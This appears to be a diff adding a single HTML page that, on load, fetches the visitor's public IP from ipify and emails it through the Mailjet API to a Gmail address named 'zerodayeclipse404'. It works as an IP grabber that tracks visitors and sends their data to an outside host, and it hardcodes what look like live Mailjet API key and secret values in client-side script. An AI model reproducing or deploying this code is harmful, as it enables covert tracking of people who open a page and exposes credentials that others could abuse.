@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log IP Address</title>
+</head>
+<body>
+    <h1>Logging IP...</h1>
+    
+    <script>
+        // Get the user's public IP address using ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+
+                // Prepare the Mailjet API request payload
+                const mailjetData = {
+                    Messages: [
+                        {
+                            From: { Email: 'zerodayeclipse404@gmail.com', Name: 'IP' },
+                            To: [{ Email: 'zerodayeclipse404@gmail.com' }],
+                            Subject: 'Public IP Logged',
+                            TextPart: `The logged public IP is: ${userIP}`,
+                        }
+                    ]
+                };
+
+                // Send the IP address to Mailjet via POST request
+                fetch('https://api.mailjet.com/v3.1/send', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Basic ' + btoa('3bc9d39600d1c518007529766fd876b3' + ':' + '5fd3020543f1f3a6c2fa2a4449eb9c54'),
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(mailjetData)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('IP Logged:', result);
+                    alert('IP address logged and sent!');
+                })
+                .catch(error => {
+                    console.error('Error sending email:', error);
+                    alert('Failed to log IP.');
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+            });
+    </script>
+</body>
+</html>
